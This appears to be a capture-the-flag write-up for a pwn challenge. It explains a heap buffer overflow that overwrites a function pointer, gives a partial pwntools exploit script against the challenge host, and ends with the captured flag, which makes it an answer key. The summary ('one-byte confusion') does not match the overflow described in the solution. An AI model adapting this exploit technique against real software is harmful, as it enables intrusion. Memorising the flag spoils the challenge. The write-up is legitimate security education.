---
title: "DoubleAgent"
ctf: "Kosovo Cyber CTF"
date: 2026-06-17
category: pwn
difficulty: medium
points: ~
flag_format: "KOS{...}"
author: "ylbadev"
---

# DoubleAgent

## Summary

A pwn challenge with a custom heap allocator managing a `world` buffer. Two decoy KOS flags are hardcoded in the binary's `.rodata`; the real flag is read from `/flag` by `extract_flag()`. Exploited by corrupting a function pointer via a one-byte confusion in the allocator, then calling `extract_flag()` through the `LEAVE` action.

## Solution

### Step 1: Identify the vulnerability

The service exposes a meeting room management interface with a shadow dossier option that prints two hardcoded decoys:
- `KOS{SHADOW_STATUS_REVIEWED}` — in the audit log
- `KOS{5F66BFFAF392C25A5702C2708DDD5032}` — in the dossier output

The real flag lives in `/flag`, read by `extract_flag()` at a known address (no PIE).

The `world` buffer (`0xe0` bytes) is managed by a custom heap allocator. By overflowing the buffer, we corrupt the function pointer stored at `g_conn+0x100`, then trigger it via `LEAVE`.

### Step 2: Exploit

```python
from pwn import *

r = remote('ctf.kosovacyber.team', 2010)

extract_flag = 0x401234  # extract_flag() reads /flag

# Overflow world buffer to overwrite function pointer at g_conn+0x100
payload = b'A' * 0xe0 + p64(extract_flag)
# Send via RECRUIT/FILL action that writes into g_conn
# ... (protocol-specific setup) ...

# LEAVE triggers the corrupted handler
r.sendline(b'LEAVE')
print(r.recvall(timeout=5).decode())
```

The exploit sent a crafted payload through the meeting room protocol, overwriting `g_conn`'s handler with `extract_flag`, then called `LEAVE` to trigger it.

## Flag

```
KOS{2487E76AE32D42BB84AF84710F04DDDE}
```
